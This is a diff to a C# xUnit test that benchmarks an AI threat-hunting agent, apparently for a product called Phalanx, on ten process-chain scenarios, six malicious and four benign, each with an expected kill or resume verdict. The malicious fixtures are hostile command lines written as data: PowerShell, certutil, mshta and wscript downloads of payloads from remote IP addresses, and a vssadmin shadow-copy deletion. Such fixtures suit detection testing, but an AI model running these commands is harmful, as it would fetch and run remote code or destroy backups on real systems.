@@ -8,6 +8,7 @@ using Phalanx.Cockpit.CQRS;
 using Phalanx.Cockpit.Storage;
 using Phalanx.Cockpit.Tools;
 using Phalanx.Shared.Protos;
+using ActionType = Phalanx.Shared.Protos.MitigationCommand.Types.ActionType;
 using Xunit;
 using Xunit.Abstractions;
 
@@ -488,39 +489,85 @@ public class AutonomousHunterAgentTests
 
         var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);
 
-        // 4대 실무 시나리오 구성
-        var scenarios = new (string Name, string ParentImage, uint ParentPid, string TargetImage, uint TargetPid, string CommandLine)[]
+        // 10대 실무 시나리오 구성 (악성 공격 6종 vs 정상 업무 4종)
+        var scenarios = new (string Name, string ParentImage, uint ParentPid, string TargetImage, uint TargetPid, string CommandLine, ActionType ExpectedAction)[]
         {
             (
-                "1. 파일리스 C2 인라인 다운로더 (Office Macro)",
-                "winword.exe", 2001,
-                "powershell.exe", 2002,
-                $"powershell.exe -NoProfile -enc {Convert.ToBase64String(Encoding.Unicode.GetBytes("Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')"))}"
+                "1. 파일리스 C2 인라인 다운로더 (Office Macro -> PowerShell)",
+                "winword.exe", 3001,
+                "powershell.exe", 3002,
+                $"powershell.exe -NoProfile -enc {Convert.ToBase64String(Encoding.Unicode.GetBytes("Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')"))}",
+                ActionType.ActionKill
             ),
             (
-                "2. LOLBAS CertUtil 악성 원격 다운로드 (Excel)",
-                "excel.exe", 2101,
-                "certutil.exe", 2102,
-                "certutil.exe -urlcache -split -f http://185.220.101.5/nc.exe C:\\Temp\\nc.exe"
+                "2. LOLBAS CertUtil 악성 원격 다운로드 (Excel -> CertUtil)",
+                "excel.exe", 3101,
+                "certutil.exe", 3102,
+                "certutil.exe -urlcache -split -f http://194.165.16.11/nc.exe C:\\Temp\\nc.exe",
+                ActionType.ActionKill
             ),
             (
-                "3. 인메모리 반사형 코드 주입 (Outlook ➔ CMD)",
-                "outlook.exe", 2201,
-                "cmd.exe", 2202,
-                "cmd.exe /c powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AYgBlAGEAYwBvAG4ALgBiAGkAbgAnACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVABlAG0AcABcAGIAZQBhAGMAbwBuAC4AYgBpAG4A"
+                "3. 이메일 첨부파일 반사형 C2 비콘 다운로드 (Outlook -> CMD -> PowerShell)",
+                "outlook.exe", 3201,
+                "cmd.exe", 3202,
+                $"cmd.exe /c powershell.exe -enc {Convert.ToBase64String(Encoding.Unicode.GetBytes("Invoke-WebRequest -Uri 'http://45.33.32.156/beacon.bin' -OutFile C:\\Temp\\beacon.bin"))}",
+                ActionType.ActionKill
             ),
             (
-                "4. 정상 관리자 인트라넷 점검 스크립트 (Explorer ➔ PowerShell)",
-                "explorer.exe", 2301,
-                "powershell.exe", 2302,
-                $"powershell.exe -enc {Convert.ToBase64String(Encoding.Unicode.GetBytes("Get-Service | Where-Object {$_.Status -eq 'Running'} | Out-File -FilePath '\\\\internal-backup.corp.local\\status.log'"))}"
+                "4. 브라우저 드라이브바이 HTA 공격 (Edge -> MSHTA)",
+                "msedge.exe", 3301,
+                "mshta.exe", 3302,
+                "mshta.exe http://193.142.59.183/exploit.hta",
+                ActionType.ActionKill
+            ),
+            (
+                "5. PDF 취약점 연계 WScript 2차 드로퍼 (Acrobat -> WScript)",
+                "AcroRd32.exe", 3401,
+                "wscript.exe", 3402,
+                "wscript.exe C:\\Users\\Public\\drop.vbs http://103.145.13.22/stage2.exe",
+                ActionType.ActionKill
+            ),
+            (
+                "6. 랜섬웨어 볼륨 섀도 복사본 영구 삭제 (Excel -> CMD -> VSSAdmin)",
+                "excel.exe", 3501,
+                "cmd.exe", 3502,
+                "cmd.exe /c vssadmin.exe delete shadows /all /quiet",
+                ActionType.ActionKill
+            ),
+            (
+                "7. 정상 관리자 백업 서비스 점검 스크립트 (Explorer -> PowerShell)",
+                "explorer.exe", 3601,
+                "powershell.exe", 3602,
+                $"powershell.exe -enc {Convert.ToBase64String(Encoding.Unicode.GetBytes("Get-Service | Where-Object {$_.Status -eq 'Running'} | Out-File -FilePath '\\\\internal-backup.corp.local\\status.log'"))}",
+                ActionType.ActionResume
+            ),
+            (
+                "8. 개발자 빌드 폴더 대용량 파일 정기 감사 (CMD -> PowerShell)",
+                "cmd.exe", 3701,
+                "powershell.exe", 3702,
+                "powershell.exe -ExecutionPolicy Bypass -Command \"Get-ChildItem -Path C:\\Projects\\Build -Recurse | Where-Object Length -gt 100MB\"",
+                ActionType.ActionResume
+            ),
+            (
+                "9. 사내 루트 인증서 신뢰 체인 검증 (Explorer -> CertUtil)",
+                "explorer.exe", 3801,
+                "certutil.exe", 3802,
+                "certutil.exe -verify -urlcache C:\\Certs\\corp_root_ca.cer",
+                ActionType.ActionResume
+            ),
+            (
+                "10. IT 시스템 자산 정보 수집 인벤토리 (Services -> PowerShell)",
+                "services.exe", 3901,
+                "powershell.exe", 3902,
+                "powershell.exe -NoProfile -Command \"Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version | Export-Csv -Path C:\\CorpLogs\\os_inventory.csv\"",
+                ActionType.ActionResume
             )
         };
 
-        var results = new List<(string Name, string Verdict, double Confidence, int Turns, double ElapsedMs)>();
+        var results = new List<(string Name, string Verdict, string Expected, bool IsMatch, double Confidence, int Turns, double ElapsedMs)>();
 
         _output.WriteLine("=========================================================================================");
-        _output.WriteLine("   PHALANX GEMINI 3.8 FLASH 멀티 시나리오 평균 턴 수 & 지연시간 실측 벤치마크 (Live)   ");
+        _output.WriteLine("   PHALANX GEMINI 3.8 FLASH 멀티 시나리오 평균 턴 수 & 지연시간 실측 벤치마크 (Live 10 Scenarios)   ");
         _output.WriteLine("=========================================================================================");
 
         foreach (var sc in scenarios)
@@ -556,13 +603,14 @@ public class AutonomousHunterAgentTests
             var res = await agent.InvestigateAsync(targetNode, cmd => Task.CompletedTask);
 
             int turns = res.Traces.Count(t => t.ActionTool != "SystemFirewallTool");
-            results.Add((sc.Name, res.VerdictAction.ToString(), res.Confidence, turns, res.Elapsed.TotalMilliseconds));
+            bool isMatch = res.VerdictAction == sc.ExpectedAction;
+            results.Add((sc.Name, res.VerdictAction.ToString(), sc.ExpectedAction.ToString(), isMatch, res.Confidence, turns, res.Elapsed.TotalMilliseconds));
 
-            _output.WriteLine($"  ✔ 판결: {res.VerdictAction} (확신도: {res.Confidence:P0}) | 소요 턴: {turns}턴 | 시간: {res.Elapsed.TotalMilliseconds:F0}ms");
+            _output.WriteLine($"  ✔ 판결: {res.VerdictAction} (기대값: {sc.ExpectedAction}, 일치여부: {(isMatch ? "MATCH" : "MISMATCH")}) | 확신도: {res.Confidence:P0} | 소요 턴: {turns}턴 | 시간: {res.Elapsed.TotalMilliseconds:F0}ms");
             _output.WriteLine($"  ✔ 사건 서사 요약: {res.SummaryTitle}");
 
-            // 구글 클라우드 RPM 버퍼링 (1초)
-            await Task.Delay(1000);
+            // 구글 클라우드 RPM 버퍼링 (1.5초)
+            await Task.Delay(1500);
         }
 
         // 통계 집계
@@ -570,17 +618,21 @@ public class AutonomousHunterAgentTests
         double avgElapsed = results.Average(r => r.ElapsedMs);
 
         _output.WriteLine("\n=========================================================================================");
-        _output.WriteLine("                               📊 벤치마크 종합 실측 결과                                ");
+        _output.WriteLine("                               📊 벤치마크 10대 시나리오 종합 실측 결과                   ");
         _output.WriteLine("=========================================================================================");
         foreach (var r in results)
         {
-            _output.WriteLine($" • [{r.Verdict,-13}] {r.Turns}턴 | {r.ElapsedMs,7:F0} ms | {r.Confidence,4:P0} | {r.Name}");
+            string status = r.IsMatch ? "PASS" : "FAIL";
+            _output.WriteLine($" • [{status}] [{r.Verdict,-13}] (기대:{r.Expected,-13}) {r.Turns}턴 | {r.ElapsedMs,7:F0} ms | {r.Confidence,4:P0} | {r.Name}");
         }
         _output.WriteLine("-----------------------------------------------------------------------------------------");
-        _output.WriteLine($" ⭐ 평균 소요 턴 수 : {avgTurns:F2} 턴 (최대 5턴 예산 대비 최적화율: {(1 - avgTurns / 5.0) * 100:F1}%)");
-        _output.WriteLine($" ⭐ 평균 완결 시간   : {avgElapsed:F0} ms ({avgElapsed / 1000.0:F2} 초 / 50초 SLA 대비 충분한 마진)");
+        _output.WriteLine($" ⭐ 총 검증 시나리오 : {results.Count}건 (악성 6건 + 정상 4건)");
+        _output.WriteLine($" ⭐ 판결 일치율(정확도): {results.Count(r => r.IsMatch)} / {results.Count} ({results.Count(r => r.IsMatch) / (double)results.Count:P0})");
+        _output.WriteLine($" ⭐ 평균 소요 턴 수   : {avgTurns:F2} 턴 (최대 5턴 예산 대비 최적화율: {(1 - avgTurns / 5.0) * 100:F1}%)");
+        _output.WriteLine($" ⭐ 평균 완결 시간     : {avgElapsed:F0} ms ({avgElapsed / 1000.0:F2} 초 / 50초 SLA 대비 충분한 마진)");
         _output.WriteLine("=========================================================================================\n");
 
+        Assert.Equal(results.Count, results.Count(r => r.IsMatch));
         Assert.True(avgTurns <= 5.0, $"평균 턴 수가 최대 한도(5턴)를 초과함: {avgTurns}");
         Assert.True(avgElapsed < 50000, $"평균 수사 시간이 50초 SLA를 초과함: {avgElapsed}ms");
     }
